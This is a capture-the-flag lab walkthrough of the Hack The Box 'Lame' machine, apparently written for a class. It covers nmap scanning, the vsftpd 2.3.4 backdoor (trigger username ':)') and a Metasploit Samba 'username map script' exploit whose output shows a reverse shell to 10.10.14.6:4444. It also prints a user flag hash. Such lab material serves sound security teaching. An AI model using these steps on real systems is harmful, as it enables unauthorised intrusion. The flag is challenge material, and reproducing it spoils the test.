# HTB Lab: Lame [10.10.10.3]

In this lab we will again run through our full pen-test process in our attempt to get root access onto the hack the box server called 'Lame'. We will also use this example to get familiar with the metasploit tool.  
___

## Lab Contents

1. Download your HTB access credentials.
2. Scanning the 'Lame' Server.
3. Examining the open ports.
4. Investigating the Anonymous FTP access.
5. Searching for any exploits for each of the open services.
6. Exploiting Vsftpd 2.3.4.
7. Further investigations
8. Claiming our prize.
9. MSFConsole command summary

___

### 1. Download your HTB access credentials.
To get access onto the HTB network we first need to configure our VPN credentials. We can do this by downloading our 'connection pack' from the access section of the HTB network. This connection pack is essentially an OpenVPn configuration file that will allow us access to the HTB network.

> Make sure that your HTB lab Access details shows your server as edge-eu-dedicated-6.hackthebox.eu. If not you should click the switch button above this marked eu-dedicated-6 Lab Access. This also assumes that you've been added to the class lab by passing your HTB username to me a couple of weeks ago.

Once you've downloaded your connection pack you should have a file called 'username.ovpn' to use this config file. open a terminal and change into the same folder as you have the .opvn file downloaded and run the command below.

```bash
sudo openvpn username.ovpn
```

> Your file will be based on your own username so remember to use the correct file name.

With your VPN connection hopefully now working. You should leave the terminal window open and switch to a new window.


### 2. Scanning the 'Lame' Server
ON your HTB online account your should see a link for Dedicated labs > eu-dedicated-6 following this link will show you a list of the currently active HTB servers for you to attempt. We will try connect to the 'Lame' server which you should see in your list and should have an IP of 10.10.10.3.

So the first thing we want do is scan what ports are open on the 'Lame' server and verify that we have connectivity to the server. 

```bash
$ sudo namp -sP 10.10.10.3
Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-21 02:06 GMT
Nmap scan report for 10.10.10.3
Host is up (0.043s latency).
Nmap done: 1 IP address (1 host up) scanned in 0.08 seconds
```

This command should verify that we have an active connection to the server. (If not go back and troubleshoot the earlier steps) Next we want to do a port scan. We'll do this in parts, first a quick scan and then some longer scans in the background to check for anything hidden.

```bash
$ mkdir Lame
$ cd Lame
$ sudo nmap -sV 10.10.10.3 -oA lame_quickscan 
Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-21 02:12 GMT
Nmap scan report for 10.10.10.3
Host is up (0.039s latency).
Not shown: 996 filtered ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.56 seconds

```

The previous command will do a quick version detection scan and save the results in all formats with the prefix lame_quickscan. From the output of the command we can see which ports are open. Before we look at them in detail let us run our full scans in the background so they can be working away while we examine the open ports we've already found.

```bash
$ sudo nmap -sV -p- -n 10.10.10.3 -oA lame_fullscan -T5
Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-21 02:18 GMT
Nmap scan report for 10.10.10.3
Host is up (0.038s latency).
Not shown: 65530 filtered ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 67.32 seconds

```
And don't forget the UDP ports

```bash
$ sudo nmap -sUV -p- -n 10.10.10.3 -oA lame_fullscan_UDP -T5
Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-21 02:19 GMT
Nmap scan report for 10.10.10.3
Host is up (0.037s latency).
Skipping host 10.10.10.3 due to host timeout
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 905.04 seconds

```

Most times our full scans don't give us an extra details or new ports to work with but in this case our full scans have given us some extra details.

### 3. Examining the open ports

Now that we've completed our port scan we start to examine each of the different ports that are open. For this box we have the following services open:

```bash
PORT     STATE SERVICE     VERSION  
21/tcp   open  ftp         vsftpd 2.3.4  
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)  
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)  
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)  
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))  
```

At this stage of a full penetration test we might run our vulnerability scanner and again leave that run in the background while we check out the open services manually. We can also use namp to run some quick checks for us to look for any basic weaknesses. So lets try that now.

```bash
$ sudo nmap -p 21,22,139,445,3632 10.10.10.3 -A -T5 -oA check_vuln
Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-21 03:03 GMT
Nmap scan report for 10.10.10.3
Host is up (0.038s latency).

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.6
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: OpenWrt White Russian 0.9 (Linux 2.4.30) (92%), Arris TG862G/CT cable modem (92%), D-Link DAP-1522 WAP, or Xerox WorkCentre Pro 245 or 6556 printer (92%), Dell Integrated Remote Access Controller (iDRAC6) (92%), Linksys WET54GS5 WAP, Tranzeo TR-CPQ-19f WAP, or Xerox WorkCentre Pro 265 printer (92%), Linux 2.4.21 - 2.4.31 (likely embedded) (92%), Linux 2.4.27 (92%), Citrix XenServer 5.5 (Linux 2.6.18) (92%), Linux 2.6.22 (92%), Linux 2.6.8 - 2.6.30 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
|_smb-security-mode: ERROR: Script execution failed (use -d to debug)
|_smb2-time: Protocol negotiation failed (SMB2)

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   36.96 ms 10.10.14.1
2   37.05 ms 10.10.10.3

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.86 seconds
 
```

We can see that anonymous FTP is enabled on the ftp sever so that should be our first point of attack.

### 4. Investigating the Anonymous FTP access
Since anonymous ftp access is enabled lets see if we can find anything interesting.

```bash
$ ftp 10.10.10.3
Connected to 10.10.10.3.
220 (vsFTPd 2.3.4)
$ Name (10.10.10.3:root): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
$ ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
226 Directory send OK.
$ ftp> pwd
257 "/"
$ ftp> quit
221 Goodbye.

```

We are abke to login to the FTP server using the username anonymous and no password but once inside we see there are no files and nothing of interest or of any use to us. So lets move on.

### 5. Searching for any exploits for each of the open services
The next step is to see if there are any known exploits for any of these open ports. We can use the handy tool searchsploit for this. (Searchsploit is part of the exploit DB project and comes pre-installed with kali, to install it yourself check out the instruction on their github page https://github.com/offensive-security/exploitdb)


```bash
$ searchsploit vsftpd 2.3.4
------------------------------------------------------------------ ----------------------------------------
 Exploit Title                                                    |  Path
                                                                  | (/usr/share/exploitdb/)
------------------------------------------------------------------ ----------------------------------------
vsftpd 2.3.4 - Backdoor Command Execution (Metasploit)            | exploits/unix/remote/17491.rb
------------------------------------------------------------------ ----------------------------------------
Shellcodes: No Result

$ searchsploit OpenSSH 4.7p1
Exploits: No Result
Shellcodes: No Result

$ searchsploit Samba smbd 3.X
Exploits: No Result
Shellcodes: No Result

$ searchsploit distccd v1
Exploits: No Result
Shellcodes: No Result

```
Using searchsploit on each of the above open services produces one promising lead. An exploit for the vsftpd 2.3.4 service. So this should be our next step.

### 6. Exploiting Vsftpd 2.3.4

Searchsploit indicated that there is a known exploit for this exact version of vsFTPd. So we will try to use metasploit to launch the exploit and get access to the server. So were going to start msf console and step through the full process.

```bash
$ msfconsole
```

```bash
msf5 > search vsftp

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
```

Next we need to tell msf that we want to use this exploit.

```bash
msf5 > use exploit/unix/ftp/vsftpd_234_backdoor
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > 
```

Each exploit we want to use will have different information that we need to set for the exploit to work, so lets check what details this exploit needs. You can use the info command to get more details about the exploit. in this case we'll use the show options command to see what options we need to set for this particular exploit.

```bash
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > show options
Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target address range or CIDR identifier
   RPORT   21               yes       The target port (TCP)


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```

From the options command we can see that their are two variables that can set (RHOSTS & RPORT) and that both are required values. We can also see that RPORT has already been set for us with the value 21. So we just need to set the RHOSTS value as the IP address of our target. Let's do that now.

```bash
$ set RHOSTS 10.10.10.3
RHOSTS => 10.10.10.3

```

Now that we have all of the required variables set we can launch the exploit and hopefully get root access to the server. We can launch our exploit using the exploit command.


```bash
$ exploit
[*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.10.10.3:21 - USER: 331 Please specify the password.
[*] Exploit completed, but no session was created.
```
Unfortunately in this case the exploit failed to work. This can often happen and sometimes its worth rerunning an exploit a few times but in this case we won't get any joy with this particular exploit. This exploit was never a weakness in the code it was hackers who got access to the sour ce code and added in a backdoor rather than exploiting a weakness in some code. The weakness only existed a few days before it was removed. There was no major code patches or updates so the version number was never changed.. so Some (very few) 2.3.4 versions were vulnerable while others where not.

If you investigated the weakness you'll see the backdoor was triggered by just trying to login using the username :), so we didn't have to use metasploit we could have just tried to ftp onto the server with the username :). This vulnerability is the metasploitable VM if you want to try it for yourself.

### 7. Further investigations

So it appears that we're at a dead end? We appear to have checked everything? Lets look again at our open services and see if we can spot anything else.

```bash
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)

```

On closer inspection you should notice that we never actually found out an exact version of Samba smb that was running on the server? Lets look again for any exploits or vulnerabilities related to the samba service. 

So for this step we are going to use one of the many auxiliary modules built into metasploit to help use get more information about the smb ports. in particular we'll be using auxiliary/scanner/smb/smb_version inside of msf console.

```bash
$ use auxiliary/scanner/smb/smb_version
$ show options

Module options (auxiliary/scanner/smb/smb_version):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   RHOSTS                      yes       The target address range or CIDR identifier
   SMBDomain  .                no        The Windows domain to use for authentication
   SMBPass                     no        The password for the specified username
   SMBUser                     no        The username to authenticate as
   THREADS    1                yes       The number of concurrent threads

```
This time we can see a few more optional values we can set but only 2 are required and THREADS is already set to 1 so we really just need to set RHOSTS.

```bash
$ exploit

[*] 10.10.10.3:445        - Host could not be identified: Unix (Samba 3.0.20-Debian)
[*] 10.10.10.3:445        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

```

Teh scan should return quickly enough and this time we should have the exact samba version of 3.0.20. so lets search for any exploits for this version. so again from inside msf console we can search for samba 3.0.20 and we'll be presented with lots of potential exploits. The job now is to try work our way through these and find something that works for us. Searching with searchsploit will give us better results and quickly point us to the 'username map script' and thats the next exploit that we'll try.


```bash
$ searchsploit samba 3.0.20
--------------------------------------------------------------------------------------------------------------------------
 Exploit Title                                                                                                                                                       |  Path
                                                                                                                                                                     | (/usr/share/exploitdb/)
--------------------------------------------------------------------------------------------------------------------------
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                                                                                     | exploits/unix/remote/16320.rb
Samba < 3.0.20 - Remote Heap Overflow                                                                                                                                | exploits/linux/remote/7701.txt
--------------------------------------------------------------------------------------------------------------------------------
Shellcodes: No Result

```
We can walk through the same steps again to launch the exploit and set the options etc. This time however the exploit should work.

```bash
$ exploit

[*] Started reverse TCP double handler on 10.10.14.6:4444 
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo lvAkii9KY4bvwjOc;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "lvAkii9KY4bvwjOc\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (10.10.14.6:4444 -> 10.10.10.3:37427) at 2019-11-21 04:07:21 +0000

```

> We are now on the terminal of the 'Lame' server and can poke around and look for files etc. or install any back doors or code we want. 

#### 8. Claiming our prize
Now that we're on the server. We need to try find the user.txt and root.txt files. That we can submit to the Hack The Box servers to prove we've gotten access to the server.

So lets try find 'users.txt'.

```bash
$ locate user.txt
/home/makis/user.txt
/usr/share/doc/fontconfig-config/fontconfig-user.txt.gz

$ cat /home/makis/user.txt
69454a937d94f5f0225ea00acd2e84c5
```

we can quickly use the locate command and then pint the contents of the file out to se the hash we need to submit on HTB to claim this server. So on the hack the box website we can go into the lame server section and find the small button 'own user' and submit our hash and give the challenge a difficultly rating. And finally we just need to find the root.txt file and submit that hash to the 'own root' link on the same webpage.

#### 9. MSFConsole command summary
So to launch: msfconsole
then: search exploit_or_service
then: use path/to/exploit/
then: info
then: show options
then: set required_variables
then: exploit
